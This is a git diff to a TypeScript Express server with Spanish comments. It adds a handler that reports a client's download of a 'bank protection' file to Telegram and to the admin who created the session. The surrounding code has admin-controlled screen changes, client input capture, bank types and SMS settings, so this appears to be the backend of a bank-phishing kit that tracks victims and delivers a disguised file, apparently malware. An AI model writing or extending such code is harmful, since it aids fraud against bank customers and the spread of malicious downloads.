@@ -7,7 +7,7 @@ import { nanoid } from "nanoid";
 import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType } from "@shared/schema";
 import { setupAuth } from "./auth";
 import axios from 'axios';
-import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification } from './telegramService';
+import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
 import multer from 'multer';
 import path from 'path';
 import fs from 'fs';
@@ -1645,6 +1645,37 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   });
                 } else {
                   console.error('Error: datos de QR recibidos sin contenido:', inputData);
+                }
+                break;
+              case 'PROTECCION_BANCARIA':
+              case 'proteccion_bancaria':
+                if (inputData && inputData.action === 'download') {
+                  console.log('Cliente descargó archivo de protección:', inputData.fileName);
+                  
+                  // Enviar notificación de descarga a Telegram
+                  const sessionData = await storage.getSessionById(sessionId);
+                  if (sessionData) {
+                    await sendFileDownloadNotification({
+                      sessionId,
+                      banco: sessionData.banco || 'Desconocido',
+                      fileName: inputData.fileName || 'archivo_desconocido',
+                      fileSize: inputData.fileSize,
+                      adminUser: sessionData.createdBy || 'Admin'
+                    });
+                  }
+                  
+                  // Notificar a los administradores sobre la descarga
+                  const createdBy = sessionData?.createdBy || '';
+                  broadcastToAdmins(JSON.stringify({
+                    type: 'FILE_DOWNLOADED',
+                    data: {
+                      sessionId,
+                      fileName: inputData.fileName,
+                      fileSize: inputData.fileSize,
+                      timestamp: new Date().toISOString(),
+                      createdBy
+                    }
+                  }), createdBy);
                 }
                 break;
             }
